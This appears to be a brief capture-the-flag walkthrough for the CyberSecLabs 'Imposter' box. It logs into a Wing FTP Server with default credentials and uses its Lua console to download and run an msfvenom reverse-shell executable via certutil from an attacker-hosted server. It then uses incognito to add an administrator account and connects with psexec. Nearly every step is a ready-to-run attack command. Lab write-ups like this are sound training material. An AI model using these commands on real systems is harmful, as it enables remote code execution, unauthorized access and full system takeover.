# Cyberseclabs : 172.31.1.20

Go to port 8080 to find the wingftp server. Login with default creds admin:password. Click on console to have a lua console.

Make a msfvenom reverse.exe using:
```zsh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.40 LPORT=443 -f exe > rev.exe
```
Start a listener at port 443
```rlwrap nc -lvnp 443```

Now host a msfvenom reverse.exe on a python server using:
```zsh
python -m SimpleHTTPServer 8000
```
In the console use certutil to upload the file using:

```os.execute('certutil.exe -urlcache -split -f http://10.10.0.40:8000/rev.exe %TEMP%/rev.exe')```

Now run the file :
```os.execute('%TEMP/rev.exe')```

C:\Program Files (x86)\Wing FTP Server\WFTPServer.exe service


Wing FTP Server(Wing FTP Server)[C:\Program Files (x86)\Wing FTP Server\WFTPServer.exe service] - Auto - Running - No quotes and Space de
tected

Well this is kinda usless coz you cannot start or query or check the service and hence the name of the box is Imposter. We will use it to do some privesc.

> https://github.com/milkdevil/incognito2

```cmd
incognito.exe add_user darkterror abcABCdefDEF@123!
```

```cmd
incognito.exe add_localgroup_user Administrators darkterror
```

```zsh
python psexec.py 'darkterror'@172.31.1.20
```
Hope this helps